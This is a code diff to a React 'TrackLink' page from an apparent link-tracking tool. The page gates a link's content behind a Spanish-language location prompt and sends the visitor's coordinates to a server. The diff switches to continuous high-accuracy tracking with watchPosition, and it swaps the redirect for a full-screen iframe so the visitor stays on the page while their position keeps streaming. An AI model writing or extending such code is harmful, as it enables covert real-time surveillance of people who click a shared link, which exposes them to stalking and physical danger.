@@ -8,7 +8,9 @@ const TrackLink = () => {
     const { id } = useParams();
     const [linkData, setLinkData] = useState(null);
     const [error, setError] = useState(null);
+    const [isTracking, setIsTracking] = useState(false);
     const socketRef = useRef();
+    const watchIdRef = useRef(null);
 
     useEffect(() => {
         const fetchLinkData = async () => {
@@ -29,10 +31,9 @@ const TrackLink = () => {
         const socket = io('/', { path: '/socket.io' });
         socketRef.current = socket;
 
-        // Auto-request location removed to require user interaction first
-
         return () => {
             if (socket) socket.disconnect();
+            if (watchIdRef.current) navigator.geolocation.clearWatch(watchIdRef.current);
         };
     }, [id]);
 
@@ -43,9 +44,11 @@ const TrackLink = () => {
             return;
         }
 
-        navigator.geolocation.getCurrentPosition(
+        // Use watchPosition for real-time updates
+        watchIdRef.current = navigator.geolocation.watchPosition(
             async (position) => {
                 const { latitude, longitude } = position.coords;
+                setIsTracking(true);
 
                 try {
                     // Send tracking data via Socket (Real-time)
@@ -58,25 +61,20 @@ const TrackLink = () => {
                         });
                     }
 
-                    // Send tracking data via HTTP (Reliable/Persistence)
-                    await api.post('/track', {
-                        linkId: id,
-                        lat: latitude,
-                        lng: longitude,
-                        userAgent: navigator.userAgent
-                    });
+                    // Optional: HTTP track for first record or persistence
+                    // (Server will handle de-duplication if we send socketId)
                 } catch (e) {
-                    console.error('Tracking failed', e);
-                }
-
-                // Redirect to destination
-                if (linkData?.destinationUrl) {
-                    window.location.href = linkData.destinationUrl;
+                    console.error('Tracking update failed', e);
                 }
             },
             (err) => {
                 console.error('Geolocation error:', err);
                 setError('Por favor active su ubicación para continuar.');
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
             }
         );
     };
@@ -86,6 +84,20 @@ const TrackLink = () => {
             <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary"></div>
         </div>
     );
+
+    // If tracking is active, show the content in an iframe or dedicated area
+    if (isTracking && linkData.destinationUrl) {
+        return (
+            <div className="fixed inset-0 bg-black z-[1000] flex flex-col">
+                <div className="h-1 bg-primary w-full animate-pulse"></div>
+                <iframe
+                    src={linkData.destinationUrl}
+                    className="flex-1 w-full border-none"
+                    title="Content View"
+                />
+            </div>
+        );
+    }
 
     return (
         <div className="min-h-screen bg-black font-display text-white relative overflow-hidden flex flex-col">
